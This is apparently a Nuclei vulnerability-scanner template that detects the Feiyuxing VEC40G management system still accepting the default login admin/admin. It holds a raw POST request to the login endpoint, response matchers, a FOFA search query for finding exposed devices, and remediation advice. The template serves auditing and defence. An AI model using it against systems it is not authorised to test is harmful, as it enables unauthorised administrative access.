id: feiyuxing-default-login

info:
  name: Feiyuxing Enterprise-Level Management System 默认口令登录（弱口令）
  author: SleepingBag945
  severity: high
  description: |
    该模板用于检测 Feiyuxing Enterprise-Level Management System 是否仍可使用默认凭据或弱口令登录。模板主要向 `/send_order.cgi?parameter=login` 等认证入口发送请求，使用内置默认凭据组合进行认证尝试，并根据响应中的 `"msg":"ok"`、`"type":` 等登录成功特征判断登录是否成功；命中说明目标未及时修改出厂、示例或初始化账号口令。
  impact: |
    - 攻击者可使用默认凭据登录 Feiyuxing Enterprise-Level Management System，获得与该账号对应的管理或业务权限。
    - 成功登录后可能进一步查看敏感信息、修改配置、创建账号、调用管理接口，或以该系统为入口访问内网其他资源。
  remediation: |
    - 立即修改或禁用默认账号，要求所有账户使用高强度唯一密码。
    - 将登录入口限制在可信网络范围内，并启用多因素认证、登录失败限制和异常登录告警。
    - 审计近期登录、配置变更和账号新增记录，必要时轮换相关密钥、令牌和业务凭据。
  reference:
    - https://github.com/wushigudan/poc/blob/main/%E9%A3%9E%E9%B1%BC%E6%98%9F%E9%BB%98%E8%AE%A4%E5%AF%86%E7%A0%81.py
  classification:
    cpe: cpe:2.3:h:feiyuxing:vec40g:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 1
    vendor: feiyuxing
    product: vec40g
    fofa-query: title="飞鱼星企业级智能上网行为管理系统"
  tags: feiyuxing,default-login,iot,vuln

http:
  - raw:
      - |
        POST /send_order.cgi?parameter=login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8

        {"username":"{{username}}","password":"{{password}}"}

    attack: pitchfork
    payloads:
      username:
        - admin
      password:
        - admin

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '"msg":"ok"'
          - '"type":'
        condition: and

      - type: word
        part: header
        words:
          - 'hash_key='

      - type: status
        status:
          - 200
